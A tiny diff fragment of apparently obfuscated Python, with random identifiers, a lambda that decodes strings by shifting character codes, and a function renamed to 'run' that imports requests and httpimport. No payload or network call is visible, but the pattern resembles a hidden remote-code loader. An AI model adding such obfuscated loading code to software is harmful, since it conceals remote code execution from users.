@@ -2,7 +2,7 @@
 
 gNUpxISCab = lambda n: (n - (4 % 1)) - 1
 cRtLShQEBj = lambda s: ''.join(chr(int(gNUpxISCab(ord(c)))) for c in s)
-def jNSLEx():
+def run():
     import requests, httpimport, json
     import threading, os, sys, shutil
 
